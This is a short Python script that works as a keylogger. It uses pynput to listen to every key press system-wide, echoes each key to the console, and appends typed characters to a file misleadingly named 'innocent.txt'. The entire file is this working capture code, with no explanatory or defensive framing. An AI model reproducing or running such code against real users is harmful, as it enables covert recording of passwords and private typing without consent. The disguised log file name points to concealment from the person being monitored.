from pynput import keyboard

def keyPressed(key):
    print(str(key))
    with open("innocent.txt", "a") as f:
        try:
            char = key.char
            f.write(char)
        except:
            print("Error getting char")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()